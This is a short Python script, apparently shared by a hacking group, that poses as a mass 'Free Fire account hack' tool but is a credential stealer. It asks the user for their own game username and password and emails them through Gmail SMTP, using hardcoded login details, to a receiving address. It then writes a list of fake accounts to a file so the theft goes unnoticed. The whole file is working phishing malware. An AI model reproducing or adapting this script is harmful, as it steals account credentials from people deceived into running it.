# coded by headlessman
import os
import smtplib
import time
from datetime import date
from colorama import Fore,Style
merah = '\x1b[1;33;41m' # color
hijau = '\x1b[1;37;42m'
kuning = '\x1b[1;37;43m'
tutupwarna = '\x1b[0m'
os.system('clear')

banner = f"""
[  {merah}Hack Akun Free Fire Massal 2021{tutupwarna}   ]
[        {merah}Dosa Tanggung Sendiri{tutupwarna}       ]

/[coded]: {kuning}headlessman{tutupwarna}
/[team]: {kuning}XploitSec-ID{tutupwarna}
/[github]: {kuning}github.com/africode7{tutupwarna}
/[testedon]: {kuning}Linux Mint{tutupwarna}
"""
print(banner)
sender = 'headlessmanlog@gmail.com' # email sender
receive = 'blockchainafri7@gmail.com' # email receive

pp = f"""
=====Harap LogIn Terlebih Dahulu...====
"""
print(pp)
inputuser = input("Username Akun FF: ")
inputuser2 = input("Password Akun FF: ")
tanggal = date.today() # date
if inputuser == "":
   print(f"{merah}Mohon Masukan Username terlebih dahulu!{tutupwarna}")
   exit()
elif inputuser2 == "":
   print(f"{merah}Mohon Masukan Password terlebih dahulu!{tutupwarna}")
   exit()
message = f"""From: Dari Email {sender}
To: Untuk Email {receive}
Subject: Akun FreeFire

====INFORMASI DETAIL====
Date: {tanggal}
Dari: {sender}
Username: {inputuser}
Password: {inputuser2}
""" # message for send to email
akunff = """
Username: kokakola7791@gmaill.com
Password: riyan9291

Username: anjay291@gmail.com
Password: Ko1023

Username: Rajawali77@gmail.com
Password: Axis194

Username: FFsultan19@gmail.com
Password: Freefire2021

Username: Anjay19249@gmail.com
Password: Freefiresultan99
""" # akun fake
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login("headlessmanlog@gmail.com","secretkey7") #login email
server.sendmail(sender, receive, message) # send result logger to email
print(f"Mendapatkan Akun FF , Mohon Tunggu Sebentar{Fore.BLUE}...{Style.RESET_ALL}")
time.sleep(3)
count = 11
for anj in range(1,count): # looping & save result
    print(f"[{Fore.GREEN}+{Style.RESET_ALL}] Saved Account Freefire_{tanggal}_akunff.txt {Fore.BLUE}{anj}{Style.RESET_ALL}/{Fore.BLUE}{count}{Style.RESET_ALL}")
    time.sleep(1)
    open("akunff.txt","a").write(akunff) # write file txt
